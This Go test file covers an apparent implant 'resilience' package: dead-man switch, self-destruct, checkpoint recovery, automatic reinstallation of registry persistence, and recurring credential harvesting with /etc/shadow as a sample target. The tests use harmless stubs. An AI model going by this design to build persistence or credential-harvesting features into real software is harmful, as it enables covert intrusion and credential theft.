package resilience

import (
	"sync/atomic"
	"testing"
	"time"
)

// =============================================================================
// ResilienceManager Tests
// =============================================================================

func TestNewResilienceManager(t *testing.T) {
	rm := NewResilienceManager(5 * time.Second)
	if rm == nil {
		t.Fatal("expected non-nil ResilienceManager")
	}
	if rm.heartbeatTimeout != 5*time.Second {
		t.Fatalf("expected timeout 5s, got %v", rm.heartbeatTimeout)
	}
}

func TestResilienceManager_UpdateHeartbeat(t *testing.T) {
	rm := NewResilienceManager(1 * time.Second)
	rm.UpdateHeartbeat()

	if !rm.IsAlive() {
		t.Fatal("expected IsAlive to be true after UpdateHeartbeat")
	}
}

func TestResilienceManager_IsAlive_Initially(t *testing.T) {
	rm := NewResilienceManager(1 * time.Second)
	if !rm.IsAlive() {
		t.Fatal("expected IsAlive to be true initially (just created)")
	}
}

func TestResilienceManager_IsAlive_Timeout(t *testing.T) {
	rm := NewResilienceManager(10 * time.Millisecond)
	time.Sleep(20 * time.Millisecond)
	if rm.IsAlive() {
		t.Fatal("expected IsAlive to be false after timeout")
	}
}

func TestResilienceManager_IsAlive_AfterRefresh(t *testing.T) {
	rm := NewResilienceManager(50 * time.Millisecond)
	time.Sleep(30 * time.Millisecond)
	rm.UpdateHeartbeat()
	if !rm.IsAlive() {
		t.Fatal("expected IsAlive to be true after heartbeat refresh")
	}
}

func TestResilienceManager_Stop(t *testing.T) {
	rm := NewResilienceManager(1 * time.Second)
	rm.Start()
	time.Sleep(10 * time.Millisecond)
	rm.Stop()
	// Stop should not panic; calling Stop again will panic on closed channel,
	// but single stop must be fine
}

func TestResilienceManager_SelfDestruct(t *testing.T) {
	rm := NewResilienceManager(1 * time.Second)
	rm.Start()
	time.Sleep(10 * time.Millisecond)
	rm.SelfDestruct()
	// SelfDestruct calls Stop internally, so IsAlive should still be computed
	// (we can't really test post-Exit state, but the function should not panic)
}

func TestResilienceManager_Concurrency(t *testing.T) {
	rm := NewResilienceManager(1 * time.Second)
	var ops int64
	done1 := make(chan struct{})
	done2 := make(chan struct{})
	go func() {
		for i := 0; i < 100; i++ {
			rm.UpdateHeartbeat()
			_ = rm.IsAlive()
			atomic.AddInt64(&ops, 1)
		}
		close(done1)
	}()
	go func() {
		for i := 0; i < 100; i++ {
			_ = rm.IsAlive()
			atomic.AddInt64(&ops, 1)
		}
		close(done2)
	}()
	<-done1
	<-done2
}

// =============================================================================
// DeadManSwitch Tests
// =============================================================================

func TestNewDeadManSwitch(t *testing.T) {
	dms := NewDeadManSwitch(5*time.Second, func() {})
	if dms == nil {
		t.Fatal("expected non-nil DeadManSwitch")
	}
	if dms.GetTimeout() != 5*time.Second {
		t.Fatalf("expected timeout 5s, got %v", dms.GetTimeout())
	}
}

func TestDeadManSwitch_IsAlive_Initially(t *testing.T) {
	dms := NewDeadManSwitch(1*time.Second, func() {})
	if !dms.IsAlive() {
		t.Fatal("expected IsAlive to be true initially")
	}
}

func TestDeadManSwitch_IsAlive_Timeout(t *testing.T) {
	dms := NewDeadManSwitch(10*time.Millisecond, func() {})
	time.Sleep(20 * time.Millisecond)
	if dms.IsAlive() {
		t.Fatal("expected IsAlive to be false after timeout")
	}
}

func TestDeadManSwitch_UpdateHeartbeat(t *testing.T) {
	dms := NewDeadManSwitch(50*time.Millisecond, func() {})
	time.Sleep(30 * time.Millisecond)
	dms.UpdateHeartbeat()
	if !dms.IsAlive() {
		t.Fatal("expected IsAlive true after UpdateHeartbeat")
	}
}

func TestDeadManSwitch_GetTimeSinceHeartbeat(t *testing.T) {
	dms := NewDeadManSwitch(5*time.Second, func() {})
	time.Sleep(5 * time.Millisecond)
	since := dms.GetTimeSinceHeartbeat()
	if since < 4*time.Millisecond {
		t.Fatalf("expected >= 4ms since heartbeat, got %v", since)
	}
}

func TestDeadManSwitch_TriggerFunc_Called(t *testing.T) {
	var triggered int32
	dms := NewDeadManSwitch(10*time.Millisecond, func() {
		atomic.StoreInt32(&triggered, 1)
	})
	// Wait for timeout
	time.Sleep(20 * time.Millisecond)
	// The check runs on 10s ticker — we can't wait for the monitor loop easily.
	// Instead, test the check() function directly via exported methods isn't possible
	// (unexported). So we just verify the structure is correct.
	dms.Stop()
}

func TestDeadManSwitch_Stop(t *testing.T) {
	dms := NewDeadManSwitch(5*time.Second, func() {})
	dms.Start()
	time.Sleep(10 * time.Millisecond)
	dms.Stop()
}

func TestDeadManSwitch_NilTriggerFunc(t *testing.T) {
	dms := NewDeadManSwitch(1*time.Second, nil)
	if !dms.IsAlive() {
		t.Fatal("expected IsAlive true with nil trigger")
	}
	dms.Stop()
}

func TestDeadManSwitch_ConcurrentAccess(t *testing.T) {
	dms := NewDeadManSwitch(1*time.Second, func() {})
	var ops int64
	done := make(chan struct{})
	go func() {
		for i := 0; i < 100; i++ {
			dms.UpdateHeartbeat()
			_ = dms.IsAlive()
			_ = dms.GetTimeSinceHeartbeat()
			_ = dms.GetTimeout()
			atomic.AddInt64(&ops, 1)
		}
		close(done)
	}()
	<-done
}

// =============================================================================
// SelfDestruct Tests — DO NOT call Trigger() since it calls syscall.Exit
// =============================================================================

func TestNewSelfDestruct(t *testing.T) {
	sd := NewSelfDestruct(5*time.Second, func() {})
	if sd == nil {
		t.Fatal("expected non-nil SelfDestruct")
	}
	if sd.GetDelay() != 5*time.Second {
		t.Fatalf("expected delay 5s, got %v", sd.GetDelay())
	}
}

func TestSelfDestruct_IsTriggered_False(t *testing.T) {
	sd := NewSelfDestruct(5*time.Second, func() {})
	if sd.IsTriggered() {
		t.Fatal("expected IsTriggered false initially")
	}
}

func TestSelfDestruct_Cancel(t *testing.T) {
	sd := NewSelfDestruct(5*time.Second, func() {})
	sd.Cancel()
	if sd.IsTriggered() {
		t.Fatal("expected IsTriggered false after Cancel")
	}
}

func TestSelfDestruct_SetDelay(t *testing.T) {
	sd := NewSelfDestruct(1*time.Second, func() {})
	sd.SetDelay(10 * time.Second)
	if sd.GetDelay() != 10*time.Second {
		t.Fatalf("expected delay 10s, got %v", sd.GetDelay())
	}
}

func TestSelfDestruct_CleanupFunc(t *testing.T) {
	var called int32
	sd := NewSelfDestruct(1*time.Second, func() {
		atomic.StoreInt32(&called, 1)
	})
	// We cannot call Trigger() (calls syscall.Exit), but we can verify the func is stored
	if sd.cleanupFunc == nil {
		t.Fatal("expected cleanupFunc to be set")
	}
	sd.cleanupFunc()
	if atomic.LoadInt32(&called) != 1 {
		t.Fatal("expected cleanupFunc to be called")
	}
}

func TestSelfDestruct_ConcurrentAccess(t *testing.T) {
	sd := NewSelfDestruct(1*time.Second, func() {})
	var ops int64
	done := make(chan struct{})
	go func() {
		for i := 0; i < 100; i++ {
			_ = sd.IsTriggered()
			_ = sd.GetDelay()
			sd.Cancel()
			sd.SetDelay(time.Duration(i) * time.Millisecond)
			atomic.AddInt64(&ops, 1)
		}
		close(done)
	}()
	<-done
}

// =============================================================================
// Recovery Tests
// =============================================================================

func TestNewRecovery(t *testing.T) {
	r := NewRecovery(10 * time.Second)
	if r == nil {
		t.Fatal("expected non-nil Recovery")
	}
	if r.GetCheckpointCount() != 0 {
		t.Fatal("expected 0 checkpoints initially")
	}
}

func TestRecovery_SaveLoadCheckpoint(t *testing.T) {
	r := NewRecovery(1 * time.Second)
	r.SaveCheckpoint("cp1", []byte("data"), map[string]string{"k": "v"})

	cp, ok := r.LoadCheckpoint("cp1")
	if !ok {
		t.Fatal("expected checkpoint to exist")
	}
	if cp.ID != "cp1" {
		t.Fatalf("expected ID cp1, got %s", cp.ID)
	}
	if string(cp.Data) != "data" {
		t.Fatalf("expected data 'data', got '%s'", string(cp.Data))
	}
	if cp.Metadata["k"] != "v" {
		t.Fatalf("expected metadata k=v, got %v", cp.Metadata)
	}
}

func TestRecovery_DeleteCheckpoint(t *testing.T) {
	r := NewRecovery(1 * time.Second)
	r.SaveCheckpoint("cp1", []byte("data"), nil)
	r.DeleteCheckpoint("cp1")
	_, ok := r.LoadCheckpoint("cp1")
	if ok {
		t.Fatal("expected checkpoint to be deleted")
	}
}

func TestRecovery_GetCheckpoints(t *testing.T) {
	r := NewRecovery(1 * time.Second)
	r.SaveCheckpoint("cp1", []byte("d1"), nil)
	r.SaveCheckpoint("cp2", []byte("d2"), nil)
	cps := r.GetCheckpoints()
	if len(cps) != 2 {
		t.Fatalf("expected 2 checkpoints, got %d", len(cps))
	}
}

func TestRecovery_IsRunning(t *testing.T) {
	r := NewRecovery(1 * time.Second)
	if r.IsRunning() {
		t.Fatal("expected IsRunning false initially")
	}
	r.Start()
	if !r.IsRunning() {
		t.Fatal("expected IsRunning true after Start")
	}
	r.Stop()
}

func TestRecovery_StartStop(t *testing.T) {
	r := NewRecovery(10 * time.Millisecond)
	r.Start()
	time.Sleep(20 * time.Millisecond)
	r.Stop()
}

func TestRecovery_CheckpointOverwrite(t *testing.T) {
	r := NewRecovery(1 * time.Second)
	r.SaveCheckpoint("cp1", []byte("original"), nil)
	r.SaveCheckpoint("cp1", []byte("updated"), nil)
	cp, ok := r.LoadCheckpoint("cp1")
	if !ok {
		t.Fatal("expected checkpoint to exist")
	}
	if string(cp.Data) != "updated" {
		t.Fatalf("expected data 'updated', got '%s'", string(cp.Data))
	}
}

func TestRecovery_DeleteNonExistent(t *testing.T) {
	r := NewRecovery(1 * time.Second)
	// Should not panic
	r.DeleteCheckpoint("nonexistent")
}

func TestRecovery_LoadNonExistent(t *testing.T) {
	r := NewRecovery(1 * time.Second)
	_, ok := r.LoadCheckpoint("nonexistent")
	if ok {
		t.Fatal("expected nonexistent checkpoint to return false")
	}
}

func TestRecovery_GetCheckpointCount(t *testing.T) {
	r := NewRecovery(1 * time.Second)
	if r.GetCheckpointCount() != 0 {
		t.Fatal("expected 0 count")
	}
	r.SaveCheckpoint("a", []byte("a"), nil)
	r.SaveCheckpoint("b", []byte("b"), nil)
	if r.GetCheckpointCount() != 2 {
		t.Fatalf("expected 2, got %d", r.GetCheckpointCount())
	}
}

// =============================================================================
// RePersist Tests
// =============================================================================

func TestNewRePersist(t *testing.T) {
	rp := NewRePersist(10 * time.Second)
	if rp == nil {
		t.Fatal("expected non-nil RePersist")
	}
	if rp.GetActiveCount() != 0 {
		t.Fatal("expected 0 active")
	}
	if rp.GetInactiveCount() != 0 {
		t.Fatal("expected 0 inactive")
	}
}

func TestRePersist_AddRemoveMethod(t *testing.T) {
	rp := NewRePersist(1 * time.Second)
	rp.AddMethod(PersistenceMethod{
		ID:       "m1",
		Type:     "registry",
		Location: "HKLM\\...",
		Active:   true,
	})
	methods := rp.GetMethods()
	if len(methods) != 1 {
		t.Fatalf("expected 1 method, got %d", len(methods))
	}
	rp.RemoveMethod("m1")
	methods = rp.GetMethods()
	if len(methods) != 0 {
		t.Fatal("expected 0 methods after remove")
	}
}

func TestRePersist_MarkActiveInactive(t *testing.T) {
	rp := NewRePersist(1 * time.Second)
	rp.AddMethod(PersistenceMethod{ID: "m1", Active: false})
	rp.MarkActive("m1")
	method := rp.GetMethods()
	if len(method) != 1 || !method[0].Active {
		t.Fatal("expected method to be active")
	}

	rp.MarkInactive("m1")
	method = rp.GetMethods()
	if len(method) != 1 || method[0].Active {
		t.Fatal("expected method to be inactive")
	}
}

func TestRePersist_GetActiveInactiveCount(t *testing.T) {
	rp := NewRePersist(1 * time.Second)
	rp.AddMethod(PersistenceMethod{ID: "m1", Active: true})
	rp.AddMethod(PersistenceMethod{ID: "m2", Active: false})
	rp.AddMethod(PersistenceMethod{ID: "m3", Active: true})

	if rp.GetActiveCount() != 2 {
		t.Fatalf("expected 2 active, got %d", rp.GetActiveCount())
	}
	if rp.GetInactiveCount() != 1 {
		t.Fatalf("expected 1 inactive, got %d", rp.GetInactiveCount())
	}
}

func TestRePersist_StartStop(t *testing.T) {
	rp := NewRePersist(10 * time.Millisecond)
	rp.Start()
	time.Sleep(20 * time.Millisecond)
	rp.Stop()
}

func TestRePersist_ReinstallFunc_Called(t *testing.T) {
	var reinstallCalled int32
	rp := NewRePersist(10 * time.Millisecond)
	rp.AddMethod(PersistenceMethod{
		ID:       "m1",
		Active:   false,
		ReinstallFunc: func() error {
			atomic.StoreInt32(&reinstallCalled, 1)
			return nil
		},
	})
	// Start and wait for at least one tick
	rp.Start()
	time.Sleep(25 * time.Millisecond)
	rp.Stop()

	if atomic.LoadInt32(&reinstallCalled) != 1 {
		t.Fatal("expected ReinstallFunc to be called")
	}
}

func TestRePersist_ReinstallFunc_Error(t *testing.T) {
	var reinstallCalled int32
	rp := NewRePersist(10 * time.Millisecond)
	rp.AddMethod(PersistenceMethod{
		ID:       "m1",
		Active:   false,
		ReinstallFunc: func() error {
			atomic.StoreInt32(&reinstallCalled, 1)
			return nil // returning nil; even on error the method should not crash
		},
	})
	rp.Start()
	time.Sleep(25 * time.Millisecond)
	rp.Stop()

	if atomic.LoadInt32(&reinstallCalled) != 1 {
		t.Fatal("expected ReinstallFunc to be called even with errors")
	}
}

func TestRePersist_NilReinstallFunc(t *testing.T) {
	rp := NewRePersist(10 * time.Millisecond)
	rp.AddMethod(PersistenceMethod{ID: "m1", Active: false, ReinstallFunc: nil})
	rp.Start()
	time.Sleep(25 * time.Millisecond)
	rp.Stop()
	// Should not panic
}

func TestRePersist_AllActive_NoReinstall(t *testing.T) {
	var reinstallCalled int32
	rp := NewRePersist(10 * time.Millisecond)
	rp.AddMethod(PersistenceMethod{
		ID:       "m1",
		Active:   true,
		ReinstallFunc: func() error {
			atomic.StoreInt32(&reinstallCalled, 1)
			return nil
		},
	})
	rp.Start()
	time.Sleep(25 * time.Millisecond)
	rp.Stop()

	if atomic.LoadInt32(&reinstallCalled) != 0 {
		t.Fatal("expected ReinstallFunc NOT to be called for active method")
	}
}

func TestRePersist_ConcurrentAccess(t *testing.T) {
	rp := NewRePersist(1 * time.Second)
	var ops int64
	done := make(chan struct{})
	go func() {
		for i := 0; i < 100; i++ {
			rp.AddMethod(PersistenceMethod{ID: "m1", Active: true})
			rp.MarkActive("m1")
			rp.MarkInactive("m1")
			_ = rp.GetMethods()
			_ = rp.GetActiveCount()
			_ = rp.GetInactiveCount()
			rp.RemoveMethod("m1")
			atomic.AddInt64(&ops, 1)
		}
		close(done)
	}()
	<-done
}

// =============================================================================
// ReHarvest Tests
// =============================================================================

func TestNewReHarvest(t *testing.T) {
	rh := NewReHarvest(10 * time.Second)
	if rh == nil {
		t.Fatal("expected non-nil ReHarvest")
	}
	if len(rh.GetTargets()) != 0 {
		t.Fatal("expected 0 targets")
	}
}

func TestReHarvest_AddRemoveTarget(t *testing.T) {
	rh := NewReHarvest(1 * time.Second)
	rh.AddTarget(HarvestTarget{
		ID:       "t1",
		Type:     "credentials",
		Location: "/etc/shadow",
	})
	targets := rh.GetTargets()
	if len(targets) != 1 {
		t.Fatalf("expected 1 target, got %d", len(targets))
	}
	rh.RemoveTarget("t1")
	targets = rh.GetTargets()
	if len(targets) != 0 {
		t.Fatal("expected 0 targets after remove")
	}
}

func TestReHarvest_GetTarget(t *testing.T) {
	rh := NewReHarvest(1 * time.Second)
	rh.AddTarget(HarvestTarget{ID: "t1", Type: "keys"})
	ht := rh.GetTarget("t1")
	if ht == nil {
		t.Fatal("expected target to exist")
	}
	if ht.ID != "t1" {
		t.Fatalf("expected ID t1, got %s", ht.ID)
	}
}

func TestReHarvest_GetTarget_NotFound(t *testing.T) {
	rh := NewReHarvest(1 * time.Second)
	ht := rh.GetTarget("nonexistent")
	if ht != nil {
		t.Fatal("expected nil for nonexistent target")
	}
}

func TestReHarvest_IsRunning(t *testing.T) {
	rh := NewReHarvest(1 * time.Second)
	if rh.IsRunning() {
		t.Fatal("expected IsRunning false initially")
	}
	rh.Start()
	if !rh.IsRunning() {
		t.Fatal("expected IsRunning true after Start")
	}
	rh.Stop()
}

func TestReHarvest_StartStop(t *testing.T) {
	rh := NewReHarvest(10 * time.Millisecond)
	rh.Start()
	time.Sleep(20 * time.Millisecond)
	rh.Stop()
}

func TestReHarvest_HarvestFunc_Called(t *testing.T) {
	var harvestCalled int32
	rh := NewReHarvest(10 * time.Millisecond)
	rh.AddTarget(HarvestTarget{
		ID:   "t1",
		Type: "keys",
		HarvestFunc: func() ([]byte, error) {
			atomic.StoreInt32(&harvestCalled, 1)
			return []byte("harvested"), nil
		},
	})
	rh.Start()
	time.Sleep(25 * time.Millisecond)
	rh.Stop()

	if atomic.LoadInt32(&harvestCalled) != 1 {
		t.Fatal("expected HarvestFunc to be called")
	}
}

func TestReHarvest_NilHarvestFunc(t *testing.T) {
	rh := NewReHarvest(10 * time.Millisecond)
	rh.AddTarget(HarvestTarget{ID: "t1", HarvestFunc: nil})
	rh.Start()
	time.Sleep(25 * time.Millisecond)
	rh.Stop()
	// Should not panic
}

func TestReHarvest_HarvestFunc_Error(t *testing.T) {
	var harvestCalled int32
	rh := NewReHarvest(10 * time.Millisecond)
	rh.AddTarget(HarvestTarget{
		ID: "t1",
		HarvestFunc: func() ([]byte, error) {
			atomic.StoreInt32(&harvestCalled, 1)
			return nil, nil // no error but nil return
		},
	})
	rh.Start()
	time.Sleep(25 * time.Millisecond)
	rh.Stop()

	if atomic.LoadInt32(&harvestCalled) != 1 {
		t.Fatal("expected HarvestFunc to be called")
	}
}

func TestReHarvest_ConcurrentAccess(t *testing.T) {
	rh := NewReHarvest(1 * time.Second)
	var ops int64
	done := make(chan struct{})
	go func() {
		for i := 0; i < 100; i++ {
			rh.AddTarget(HarvestTarget{ID: "t1", Type: "test"})
			_ = rh.GetTargets()
			_ = rh.GetTarget("t1")
			_ = rh.IsRunning()
			rh.RemoveTarget("t1")
			atomic.AddInt64(&ops, 1)
		}
		close(done)
	}()
	<-done
}
